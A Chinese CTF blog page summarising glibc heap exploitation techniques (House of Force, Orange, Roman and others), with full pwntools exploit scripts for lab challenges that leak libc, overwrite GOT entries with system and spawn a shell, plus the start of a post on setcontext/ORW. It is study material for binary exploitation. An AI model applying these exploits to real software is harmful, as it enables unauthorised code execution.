              <time title="创建时间：2022-01-11 16:11:44 / 修改时间：16:13:30" itemprop="dateCreated datePublished" datetime="2022-01-11T16:11:44+08:00">2022-01-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="wiki上的house系列"><a href="#wiki上的house系列" class="headerlink" title="wiki上的house系列"></a>wiki上的house系列</h1><h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>思路：主要还是利用unlink,如果程序可以修改prev_size和prev_inuse，那向后合并的时候就可以指向后面任意一个堆了。（overlap）</p>
<h2 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h2><p>思路：利用top_chunk完成任意地址申请，当申请堆时，如果要用top_chunk时，就会比较申请的堆和top_chunk的大小，如果大于的话就会在top_chunk上切割一块下来，假如先修改top_chunk的size为0xffffffffffffffff(比较大小时化作无符号数，因此这个数是最大的)，我们再申请一个负数，那最后top_addr=原来的top_chunk的地址减去申请的数，只要计算好确定的offest，就可以把top_chunk挪移到任意地址，然后再申请出来就好了。</p>
<h5 id="例题：HITCON-training-lab-11"><a href="#例题：HITCON-training-lab-11" class="headerlink" title="例题：HITCON training lab 11"></a>例题：HITCON training lab 11</h5><p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please enter the name of item:&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,length,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please enter the index of item:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please enter the new name of the item:&#x27;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please enter the index of item:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#house of force</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x120</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x510</span>+<span class="number">0x110</span>+<span class="number">1</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;2 : &#x27;</span>)</span><br><span class="line">libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">88</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">target_addr=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xc0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;2 : &#x27;</span>)</span><br><span class="line">top_addr=u64(sh.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))+<span class="number">0x80</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(top_addr)</span><br><span class="line">atoi_addr=elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">offset=atoi_addr-top_addr-<span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(offset)</span><br><span class="line">add(offset,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">add(<span class="number">0x8</span>,p64(system))</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h2><p>是针对smallbin的攻击，感觉这个挺好用的，以后可以多试试</p>
<p>思路：当需要从smallbin上面脱掉最后一个链时，需要倒数第二个链和bin进行链表处理，会执行以下代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 获取 small <span class="built_in">bin</span> 中倒数第二个 chunk 。</span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    goto errout;</span><br><span class="line">&#125;</span><br><span class="line">// 设置 victim 对应的 inuse 位</span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">// 修改 small <span class="built_in">bin</span> 链表，将 small <span class="built_in">bin</span> 的最后一个 chunk 取出来</span><br><span class="line"><span class="built_in">bin</span>-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = <span class="built_in">bin</span>;</span><br></pre></td></tr></table></figure>

<p>可见，主要控制bk,然后伪造一个chunk通过bck-&gt;fd != victim判断，就可以让一个伪造的chunk进入smallbin</p>
<p>感觉当没开启pie的时候可以完成堆到bss的申请。</p>
<h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><p>思路：当申请的堆的大小大于top_chunk时，top_chunk就会被free掉进入bin,当程序没有free功能时可以利用这个特性完成free_chunk，但一般程序会对申请大小做限制，不会超过top_chunk_size，所以要通过溢出修改top_chunk大小，不过也不能随便修改，得让top_chunk_size+top_chunk_addr是0x1000的整数倍才行。</p>
<p>例题：ductf上的pwn1的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./main&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;47.106.172.144&#x27;</span>,<span class="number">65001</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">elf =ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">ogg=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">count</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;List count: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(count))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_item</span>(<span class="params">list_id,item_id</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;List id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(list_id))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Item id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(item_id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overwrite</span>(<span class="params">list_id,star_id,end_id,number</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;List id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(list_id))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Star id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(star_id))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;End id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(end_id))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;New number: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(number))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">list_id,item_id,number</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;List id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(list_id))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Item id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(item_id))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;New number: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(number))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">23</span>)</span><br><span class="line">overwrite(<span class="number">0</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">0x1311</span>)</span><br><span class="line">add(<span class="number">0x1400</span>)</span><br><span class="line">add(<span class="number">23</span>)</span><br><span class="line">overwrite(<span class="number">0</span>,<span class="number">29</span>,<span class="number">29</span>,<span class="number">0x50000000</span>)</span><br><span class="line">show_item(<span class="number">2</span>,<span class="number">24</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;: &#x27;</span>)[<span class="number">1</span>])-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">88</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc.address)</span><br><span class="line">system=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">atoi_got=elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(atoi_got)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system)</span><br><span class="line">overwrite(<span class="number">0</span>,<span class="number">24</span>,<span class="number">24</span>,atoi_got)</span><br><span class="line">overwrite(<span class="number">0</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">0x50000000</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>,system)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h2><p>以前打比赛遇见过</p>
<p>思路：利用的是fastbin的 malloc consolidate，当申请的堆块的大小大于fasbin的最大值的时候就会触发malloc_consolidat,如果没有使用的话就会把相邻的堆块进行合并，然后放到smallbin上面，合并当然是ublink，无非就是利用prev_size和自身的size来完成合并，只要伪造size就可以完成后面的任意堆合并了。</p>
<p>正常堆块</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220111154212459.png" alt="image-20220111154212459"></p>
<p>完成伪造后</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220111154245300.png" alt="image-20220111154245300"></p>
<p>然后再申请一个大堆，就完成chunk2和chunk4的合并了，完成overlap</p>
<p>malloc_consolidat不仅可以用来完成overlap，当能申请的堆很小的时候，还可以通过他把小堆合并放到smallbin上面达到leak出libc地址</p>
<h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h2><p>主要用途，当没有leak函数时通过爆破来完成getshell(感觉要看脸)</p>
<p>前情提要：当一个程序开启pie时虽然基地址是随机的（但随机的很有限），由于是分页管理，所以基地址的最后十二位是0，具体到某一个代码的地址就是基地址加上这个代码的偏移量，如果两个代码的地址不超过0xfff（当然超过也行，别太大就行）,就可以通过修改最后十二位来让这个地址指向另一个代码，但是修改数据是8个字节8个字节修改，第十二位到第十六位不清楚，只能采用爆破的方法来猜正确地址，这个攻击手法就利用这个思路。</p>
<p>思路：unsortedbin上面libc地址和malloc_hook地址很接近，可以通过爆破把这个地址改成malloc_hook，然后把这个堆分配到fasbin上面，申请到mallo_hook附近的空间，然后通过unsortedbin_attack把malloc_hook写上libc的地址，然后再通过爆破的方法把这个地址改成ogg，然后触发malloc_hook(申请或者doublefree)完成getShell,这里帖一个别人梳理的具体步骤</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220111160730455.png" alt="image-20220111160730455"></p>
<p>例题 new_chall</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ogg=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;3. Free&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Enter size of chunk :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Enter index :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;3. Free&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Enter index of chunk :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Enter data :&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;3. Free&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Enter index :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    add(<span class="number">0x18</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>,<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x41</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>,<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x71&#x27;</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p16(<span class="number">0x7020</span>))</span><br><span class="line">    edit(<span class="number">1</span>,p16(<span class="number">0x1aed</span>))</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">9</span>)</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    edit(<span class="number">13</span>,p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">10</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    edit(<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p16(<span class="number">0x1b00</span>))</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">12</span>)</span><br><span class="line">    edit(<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+<span class="string">&#x27;\xa4\xd3\xaf&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Enter name :&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;rootzhang&#x27;</span>)</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>

<h2 id="House-of-Pig"><a href="#House-of-Pig" class="headerlink" title="House of Pig"></a>House of Pig</h2><p>涉及了io_file,暂时不做总结</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/09/setcontext-mprotect-orw/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/09/setcontext-mprotect-orw/" class="post-title-link" itemprop="url">setcontext+mprotect+orw</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-09 16:07:55 / 修改时间：16:08:22" itemprop="dateCreated datePublished" datetime="2022-01-09T16:07:55+08:00">2022-01-09</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="setcontext-mprotect-orw"><a href="#setcontext-mprotect-orw" class="headerlink" title="setcontext+mprotect+orw"></a>setcontext+mprotect+orw</h1><p>摆烂多日的第一次提笔，这篇博客其实想写好久了，但是由于各种原因拖到现在，不说废话了，直接开写。</p>
<p>先细致的讲解一下setcontext和orw</p>
<h2 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h2><p>一个大概函数一样的东西，主要作用就是把通过它把程序跳转到我门已经设置好的rop上面，使用这个手法的条件有两个，一个是你能跳到这个函数上面（拿到程序流），二是控制了rip，下面是setcontext的汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0x00007fc35bf5f1b5 &lt;+53&gt;:	mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">   0x00007fc35bf5f1bc &lt;+60&gt;:	mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">   0x00007fc35bf5f1c3 &lt;+67&gt;:	mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">   0x00007fc35bf5f1c7 &lt;+71&gt;:	mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">   0x00007fc35bf5f1cb &lt;+75&gt;:	mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">   0x00007fc35bf5f1cf &lt;+79&gt;:	mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">   0x00007fc35bf5f1d3 &lt;+83&gt;:	mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">   0x00007fc35bf5f1d7 &lt;+87&gt;:	mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">   0x00007fc35bf5f1de &lt;+94&gt;:	push   rcx</span><br><span class="line">   0x00007fc35bf5f1df &lt;+95&gt;:	mov    rsi,QWORD PTR 